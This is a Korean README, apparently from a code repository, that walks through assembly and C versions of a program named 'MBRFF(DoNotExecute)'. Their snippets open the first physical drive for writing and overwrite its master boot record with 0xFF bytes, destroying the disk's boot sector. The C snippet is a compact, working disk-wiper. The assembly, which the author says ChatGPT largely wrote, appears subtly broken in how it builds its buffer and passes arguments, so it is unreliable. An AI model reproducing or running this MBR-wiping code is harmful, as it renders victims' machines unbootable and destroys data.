# MBRFF(DoNotExecute).asm
이 프로그램은 MBRFF(DoNotExecute).py를 기반으로 어셈블리어로 제작성한 파일입니다. 작동방법은 MBRFF(DoNotExecute).py와 같습니다.

~~어셈블리어를 공부하기위해 만들었긴 했지만 chatgpt 지분 99%..~~
```asm
disk_path db '\\.\PhysicalDrive0', 0
```
disk_path는 문자열로 물리적 디스크에 대한 경로(\\\\.\\PhysicalDrive0)를 지정합니다. 이 경로는 시스템의 첫 번째 물리적 드라이브에 접근하도록 지정합니다.


```asm
push 0
push 0
push 3
push 0
push 0x40000000
push disk_path
call [CreateFileA]

```
위 스니펫은 Windows API의 CreateFileA를 호출하여 디스크에 접근합니다. 
접근 모드는 GENERIC_WRITE로 설정되어, 디스크에 데이터를 쓸 권한을 요청합니다.

```asm
mov ecx, 512
xor edi, edi

.fill_buffer:
    mov byte [edi], 0xFF
    inc edi
    loop .fill_buffer
```

512바이트의 버퍼를 준비하고, 각 바이트들을 0xFF로 지정합니다. 이 버퍼는 WriteFile을 사용하여 MBR이 이 버퍼로 덮어쓰기됩니다.


```asm
push 0
push ecx
push edi
push eax
call [WriteFile]
```
위 fill_buffer에 있는 데이터로 디스크 첫번째 섹터(MBR)에 덮어씁니다.


# MBRFF(DoNotExecute).c
이 프로그램은 MBRFF(DoNotExecute).py를 기반으로 c언어로 제작성한 파일입니다. 작동방법은 MBRFF(DoNotExecute).py와 같습니다.


```c
HANDLE hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
```
CreateFile함수를 사용하여 \\.\PhysicalDrive0 드라이블를 Generic_write모드로 엽니다.


```c
BYTE buffer[512];
memset(buffer, 0xFF, sizeof(buffer));
BOOL result = WriteFile(hDisk, buffer, sizeof(buffer), &bytesWritten, NULL);
```

버퍼를 512바이트로 생성후 0xFF로 초기화하고, WriteFile을 사용하여 디스크 MBR위치에 덮어씁니다.
